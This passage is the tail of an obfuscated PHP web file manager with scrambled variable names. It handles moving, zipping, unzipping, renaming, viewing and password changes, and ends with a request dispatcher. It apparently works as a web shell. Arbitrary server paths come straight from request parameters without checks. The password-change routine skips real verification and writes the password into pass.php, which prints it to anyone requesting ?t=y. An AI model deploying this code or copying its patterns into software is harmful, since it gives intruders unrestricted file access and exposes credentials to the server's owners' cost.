    $Vz354l0rh54h1 = "$Vh1wfqofbisd".$Vnjbfyut5zad; 
    $Vz354l0rh54h2 = "$Vh1wfqofbisd".$Vfocwlj0ueb4;

    if(rename($Vz354l0rh54h1,$Vz354l0rh54h2)) {
      echo "The file ".$Vh1wfqofbisd.$Vnjbfyut5zad." has been changed to <a href=\"".@$Vbtiwmtugqik."?op=viewframe&file=".$Vfocwlj0ueb4."&folder=$Vh1wfqofbisd\">".$Vh1wfqofbisd.$Vfocwlj0ueb4."</a>\n";
    } else {
      echo "There was a problem renaming this file\n";
    }
    mainbottom();
  } else {
    home();
  }
}








function listdir($V4prvkagdnq4, $Vmmnvex20hgt = 0) {
  global $V2uv11mkpnb4;
    if (!@($Vznoi00qmpf0 = opendir($V4prvkagdnq4))) { return; }
    while ($Vv3ds52jsmyntem = readdir($Vznoi00qmpf0) ) {
      if (is_dir("$V4prvkagdnq4/$Vv3ds52jsmyntem") && (substr("$Vv3ds52jsmyntem", 0, 1) != '.')) {
        listdir("$V4prvkagdnq4/$Vv3ds52jsmyntem", $Vmmnvex20hgt + 1);
      }
    }
    if ($Vmmnvex20hgt > 0) {
      $V4prvkagdnq4 = @ereg_replace("[/][/]", "/", $V4prvkagdnq4);
      $V2uv11mkpnb4 .= "<option value=\"".$V4prvkagdnq4."/\">".$V4prvkagdnq4."/</option>";
    }
}









function mov() {
  
  
    global $Vr2dlypuv4mu, $V2uv11mkpnb4, $Vwnjajrupcwx;
	
  if (@$_REQUEST['op']) {
    maintop("Move");
   echo "<form action=\"".@$Vbtiwmtugqik."?op=move&dir=".$Vwnjajrupcwx."\" method=\"post\">\n";
$Vzfedfchezv4 = @$_POST['moveee'];
for($Vv3ds52jsmyn=0; $Vv3ds52jsmyn<sizeof($Vzfedfchezv4); $Vv3ds52jsmyn++)
{
echo "<input type=\"hidden\" name=\"moveee[]\" value=\"".$Vzfedfchezv4[$Vv3ds52jsmyn]."\">".$Vzfedfchezv4[$Vv3ds52jsmyn]."<br>";
}
echo"<select name=ndir size=1>\n"
        ."<option value=\"".$Vr2dlypuv4mu."\">".$Vr2dlypuv4mu."</option>";
    listdir($Vr2dlypuv4mu);
    echo $V2uv11mkpnb4
        ."</select>"
		."<input type=\"Submit\" value=\"Move\" class=\"submit\">\n";
    mainbottom();
  } else {
    home();
  }
 
  
}

function getDirectory( $Vgijk5liljtc = '.', $Vxpvngbluma0 = 0 ){
$Vv3ds52jsmyngnore = array( 'cgi-bin', '.', '..' ); 

if(is_dir($Vgijk5liljtc)){
$V3njkp42wyqz = @opendir( $Vgijk5liljtc ); 


while( false !== ( $Vmtjosntglqr = readdir( $V3njkp42wyqz ) ) ){ 


    if( !in_array( $Vmtjosntglqr, $Vv3ds52jsmyngnore ) ){ 
    

        $V1agswsenwwg = str_repeat( '�', ( $Vxpvngbluma0 * 4 ) ); 
        
        

        if( is_dir( "$Vgijk5liljtc/$Vmtjosntglqr" ) ){ 
        

           
            getDirectory( "$Vgijk5liljtc/$Vmtjosntglqr", ($Vxpvngbluma0+1) ); 
            
            

        } else { 
		
          echo '<br><input type="hidden" id="zipeee[]" name="zipeee[]" value="'.$Vgijk5liljtc.'/'.$Vmtjosntglqr.'"  />'.$Vgijk5liljtc.'/'.$Vmtjosntglqr ; 
		              

        } 

    } 

} 

closedir( $V3njkp42wyqz ); 

}
else
{
	echo '<br><input type="hidden" id="zipeee[]" name="zipeee[]" value="'.$Vgijk5liljtc.'"  />'.$Vgijk5liljtc ; 
}

}

function zip() {
  
  
    global $Vr2dlypuv4mu, $V2uv11mkpnb4, $Vwnjajrupcwx;
	
	    maintop("zip");

  if (@$_REQUEST['op']) {

if(@$_POST['zipss']=="Zip")
{
$V5ux23f3tdml = $_REQUEST['dir']; 
$Vinppq5bddgl  = $_REQUEST['ndir'].$_REQUEST['zipname'].".zip"; 
$Vzj3gp0lxjum      = 5000           ; 



$V4prvkagdnq4list = new RecursiveDirectoryIterator($V5ux23f3tdml);
$Vmtjosntglqrlist = new RecursiveIteratorIterator($V4prvkagdnq4list);

ini_set('max_execution_time', $Vzj3gp0lxjum);

$Vnlzh25nluju = new ZipArchive;

if ($Vnlzh25nluju->open($Vinppq5bddgl, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) !== TRUE) {
    die ("Could not open archive");
}


$Vzfedfchezv4 = @$_POST['zipeee'];

for($Vv3ds52jsmyn=0; $Vv3ds52jsmyn<sizeof($Vzfedfchezv4); $Vv3ds52jsmyn++)
{
	echo"<br>";
	echo $Vzfedfchezv4[$Vv3ds52jsmyn];
	$Vnlzh25nluju->addFile(realpath($Vzfedfchezv4[$Vv3ds52jsmyn]), $Vzfedfchezv4[$Vv3ds52jsmyn]) or die ("ERROR: Could not add file: $Vjmybvoqhvi1");
}



   



$Vnlzh25nluju->close();
echo "<br>Archive ". $Vinppq5bddgl . " created successfully.";

echo "<a href=\"http:".$Vinppq5bddgl."\" target=\"_blank \">";
echo "Download ".$Vinppq5bddgl."</a>"; 
}
else{
	
   echo "<form ACTION=\"".@$Vbtiwmtugqik."?op=zip&dir=".$Vwnjajrupcwx."\" METHOD=\"POST\">\n";
$Vzfedfchezv4 = @$_POST['zipeee'];
for($Vv3ds52jsmyn=0; $Vv3ds52jsmyn<sizeof($Vzfedfchezv4); $Vv3ds52jsmyn++)
{
	getDirectory($Vzfedfchezv4[$Vv3ds52jsmyn]);

}
echo "<br>Enter Zip Name:<br><input type=\"text\" name=\"zipname\" value=\"".@$_REQUEST['zipname']."\" ><br>";
echo"Destination:<br><select name=ndir size=1>\n"
        ."<option value=\"".$Vr2dlypuv4mu."\">".$Vr2dlypuv4mu."</option>";
    listdir($Vr2dlypuv4mu);
    echo $V2uv11mkpnb4
        ."</select>"
		."<input type=\"Submit\" value=\"Zip\" class=\"submit\" name=\"zipss\">\n";}

    mainbottom();
  } 
  else {
    home();
  }
 
  
}










function move($Vh1wfqofbisd) {
 global $Vh1wfqofbisd;
 
    maintop("Move");
   
$Vzfedfchezv4 = @$_POST['moveee'];
for($Vv3ds52jsmyn=0; $Vv3ds52jsmyn<sizeof($Vzfedfchezv4); $Vv3ds52jsmyn++)
{

 if (rename($Vh1wfqofbisd.$Vzfedfchezv4[$Vv3ds52jsmyn], $_REQUEST['ndir'].$Vzfedfchezv4[$Vv3ds52jsmyn])) {
      echo $Vzfedfchezv4[$Vv3ds52jsmyn]." has been succesfully moved to ".@$_REQUEST['ndir'];
    } else {
      echo "There was an error moving ".$Vzfedfchezv4[$Vv3ds52jsmyn];
    }




 } 
 mainbottom();
}









function viewframe($Vmtjosntglqr) {
  global $Vcytgghiywp0, $Vh1wfqofbisd, $Vnwchvuthuva, $Vwnjajrupcwx,$Ve0yv51w3usj;  
  if ($Vwnjajrupcwx == "/") {
    $Vvbd2n2rgtvy="**ERROR: You selected to view $Vmtjosntglqr but your home directory is /.**";
    printerror($Vvbd2n2rgtvy);
    die();
  } elseif (@ereg("/home/",$Vh1wfqofbisd)) {
    $Vh1wfqofbisdx = @ereg_replace("@$Vwnjajrupcwx", "", $Vh1wfqofbisd);
    $Vh1wfqofbisd = "http://".$Vnwchvuthuva."/".$Vh1wfqofbisdx;
  }

  
  
  
   echo "<html>\n"
      ."<head>\n"
      ."<title>$Vcytgghiywp0 :: Viewing file - $Vmtjosntglqr</title>\n"
      ."</head>\n\n"
	   ."$Vcytgghiywp0 :: Viewing file - $Vmtjosntglqr\n<a href=".$Ve0yv51w3usj.">Home</a>"
 
    
	 ." <iframe name=\"content\" src=\"".$Vh1wfqofbisd.$Vmtjosntglqr."\" frameborder=\"0\" width=\"100%\" height=\"100%\"></iframe>"
      
      

      ."<body>\n"
      ."</body>\n"
      ."</html>\n";
  
  
 
}









function viewtop($Vmtjosntglqr) {
  global $V0lujlxjsppq, $Ve0nkopt3bwa;
  $V0lujlxjsppq = "yes";
  $Ve0nkopt3bwa = "target=_top";
  maintop("Viewing file - $Vmtjosntglqr");
}
function pass(){
	
	
$Vv3ds52jsmynswrite = $_POST['what'];
if($Vv3ds52jsmynswrite == "write")
{
   
    $Vtkrkapw4muv = $_POST['oldpwrd'];
      $V20efxkqwcxk = $_POST['newpwrd'];
    if($Vtkrkapw4muv!="" && $V20efxkqwcxk!=""){

    if($Vts415tbijrp == $V1nugerjffkb ){
	$Vmtjosntglqre = "pass.php";
	$Vmtjosntglqr1 = file($Vmtjosntglqre);
	$Vmtjosntglqr = fopen($Vmtjosntglqre,'w');
	fwrite($Vmtjosntglqr, "<?php \n");
	fwrite($Vmtjosntglqr, "$");
	fwrite($Vmtjosntglqr, "setpassword=\"$V20efxkqwcxk\";\n");
	fwrite($Vmtjosntglqr, "if(@$");
	fwrite($Vmtjosntglqr, "_GET['t']==\"y\")\n");
	fwrite($Vmtjosntglqr, "{echo $");
	fwrite($Vmtjosntglqr, "setpassword;}");
 	fwrite($Vmtjosntglqr, "\n?>");
	fclose($Vmtjosntglqr);
    echo "<div align=center style='color: green;'><b>Password have been updated</div>";    
    }
    else{
	echo "<div align=center style='color: red;'><b>Invalid Username or Password </div>";
    }

    }
	
}
 maintop("Password");
?>
<table>
  <form name=fil method=post>
    <tr>
      <td colspan=2 align=center>Edit Password<br></td>
    </tr>
    <tr>
      <td>Old PassWord</td>
      <td><input type="password" name="oldpwrd"></td>
    </tr>
    <tr>
      <td>New PassWord</td>
      <td><input type="password" name="newpwrd"></td>
    </tr>
    <tr>
      <td></td>
      <td><input type="hidden" value="write" name="what">
        <input type='submit' value="submit"></td>
    </tr>
  </form>
</table>
<?php
	 mainbottom();
	}









function unzips()
{ global $Vr2dlypuv4mu, $Vh1wfqofbisd, $V2uv11mkpnb4, $Vwnjajrupcwx ,$Vopl2u1eoqpv ,$Vwnjajrupcwx;
  echo "<FORM  ACTION=\"".@$Vbtiwmtugqik."?op=unzip&dir=".$Vwnjajrupcwx."\" METHOD=\"POST\">\n";
  
$Vmtjosntglqrlist=glob($Vwnjajrupcwx.'*.zip');
			foreach($Vmtjosntglqrlist as $Vmtjosntglqr) 
{  
echo "<input type=\"radio\" name=\"Zips\"  value=\"".$Vmtjosntglqr."\">".$Vmtjosntglqr."<br />";
  
}
     
	   echo "<br><br>Destination:<br><select name=\"ndir\" size=1>\n"
      ."<option value=\"".$Vr2dlypuv4mu."\">".$Vr2dlypuv4mu."</option>";
  listdir($Vr2dlypuv4mu);
  echo $V2uv11mkpnb4
      ."</select><br><br>"

      ."<input type=\"submit\" value=\"Unzip\" class=\"submit\">\n"
      ."</form>\n";
@$Vnlzh25nlujuss = $_REQUEST['Zips'];
if($Vnlzh25nlujuss)
{
$Vgakoa0jyrld = $_REQUEST['Zips'];
$V3ww2vvzbyhn = $_REQUEST['ndir'];
$Vnlzh25nluju = new ZipArchive();
		$Vvuyclibv3ij = $Vnlzh25nluju->open($Vgakoa0jyrld);
		if ($Vvuyclibv3ij === true) {
			$Vnlzh25nluju->extractTo($V3ww2vvzbyhn); 
			$Vnlzh25nluju->close();
			echo "your Zip File '".$Vgakoa0jyrld."' Unzip";
			}
}


mainbottom();
			
			 
}






function mainbottom() {
	?>
<script type="text/javascript">
function createOrder()
{

coffee=document.forms[0].coffee;
txt="";
for (i=0;i<coffee.length;++ i)
  {
  if (coffee[i].checked)
    {
    txt=txt + coffee[i].value + " ";
    }
  }
document.getElementById("order").value="You ordered a " + txt;
}
function check(dd)
{
if(dd=="ch"){
coffee=document.forms[0].coffee;
for (i=0;i<coffee.length;++ i)
  {
  coffee[i].checked=true;
  }
  document.getElementById("allcecked").value="unch";
  }
  else
  {
  coffee=document.forms[0].coffee;
for (i=0;i<coffee.length;++ i)
  {
  coffee[i].checked=false;
  }
  document.getElementById("allcecked").value="ch";
  }
}



function checkmo(dd)
{


if(dd=="ch"){
movee=document.forms[0].movee;
for (i=0;i<movee.length;++ i)
  {
  movee[i].checked=true;
  }
  document.getElementById("allceckedmove").value="unch";
  }
  else
  {
  movee=document.forms[0].movee;
for (i=0;i<movee.length;++ i)
  {
  movee[i].checked=false;
  }
  document.getElementById("allceckedmove").value="ch";
  }
}

function checkzip(dd)
{


if(dd=="ch"){
zipee=document.forms[0].zipee;
for (i=0;i<zipee.length;++ i)
  {
  zipee[i].checked=true;
  }
  document.getElementById("allceckedzip").value="unch";
  }
  else
  {
  zipee=document.forms[0].zipee;
for (i=0;i<zipee.length;++ i)
  {
  zipee[i].checked=false;
  }
  document.getElementById("allceckedzip").value="ch";
  }
}

function chmodss(dd)
{


if(dd=="ch"){
zipee=document.forms[0].zipeech;
for (i=0;i<zipeech.length;++ i)
  {
  zipeech[i].checked=true;
  }
  document.getElementById("allceckedchmod").value="unch";
  }
  else
  {
  zipee=document.forms[0].zipeech;
for (i=0;i<zipeech.length;++ i)
  {
  zipeech[i].checked=false;
  }
  document.getElementById("allceckedchmod").value="ch";
  }
}


</script>
<?php
  echo "<tr><td><hr><br><center>
  </td></tr></table></table>\n"
."</form>"
      ."</body>\n"
      ."</html>\n";
  exit;
}








function printerror($Vvbd2n2rgtvy) {
  maintop("ERROR");
  echo "<font class=error>\n".$Vvbd2n2rgtvy."\n</font>";
  mainbottom();
}







switch($Vm3t3nwabn1h) {

    case "home":
	home();
	break;

    case "up":
	up();
	break;

    case "upload":
	upload(@$_FILES['upfile'], @$_REQUEST['ndir']);

	break;

    case "del":
	del($_REQUEST['dename']);
	break;
	
	case "delall":
	delal();
	break;

    case "delete":
	delete($_REQUEST['dename']);
	break;

    case "edit":
	edit($_REQUEST['fename']);
	break;

    case "save":
	save($_REQUEST['ncontent'], $_REQUEST['fename']);
	break;

    case "cr":
	cr();
	break;

    case "create":
	create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
	break;

    case "ren":
	ren($_REQUEST['file']);
	break;

    case "rename":
	renam($_REQUEST['rename'], $_REQUEST['nrename'], $Vh1wfqofbisd);
	break;

    case "mov":
	mov();
	break;

    case "move":
	move($Vh1wfqofbisd);
	break;

    case "viewframe":
	viewframe($_REQUEST['file']);
	break;

    case "viewtop":
	viewtop($_REQUEST['file']);
	break;
	case "unzip":
	maintop("Unzip");
	unzips();
	break;
	
	case "zip":
	zip();
	break;

    case "printerror":
	printerror($Vvbd2n2rgtvy);
	break;

    case "logout":
	logout();
	break;
	
	case "pass":
	pass();
	break;

    default:
	home();
	break;
}
?>
<?php


?>
<?php

class breadcrumbs{

    
    public $Vzg10eyw5ixhreadcrumbs;

    
    private $V2hy2w343gsw = '&raquo;';

    
    private $Vgpxsejymaox;

    
    private $Vdwgcwa1c1hi;


    
    public function __construct()
    {
        $this->setParts();
        $this->setURL();
        $this->breadcrumbs = '<a href='.$Ve0yv51w3usj.'?op=home>Home</a>';
    }


    
    private function setURL()
    {
        $Vbzv311lvfml = $_SERVER["SERVER_PROTOCOL"]=='HTTP/1.1' ? 'http' : 'https';
        $this->url = $Vbzv311lvfml.'://'.$_SERVER['HTTP_HOST'];
    }


    public function setPointer($V2hy2w343gsw)
    {
        $this->pointer = $V2hy2w343gsw;
    }


    private function setParts()
    {
        $Vdwgcwa1c1hi = explode('/', $_SERVER['REQUEST_URI']);
        array_pop($Vdwgcwa1c1hi);
        array_shift($Vdwgcwa1c1hi);
    $this->parts = $Vdwgcwa1c1hi;
    }


    public function crumbs()
    {
        foreach($this->parts as $Vqzpvy2vez0n)
        {
            $this->url .= "/$Vqzpvy2vez0n";
            $this->breadcrumbs .= " > ".'<a href="'.$this->url.'/">'.$Vqzpvy2vez0n.'</a>';
        }
    }

} 

?>
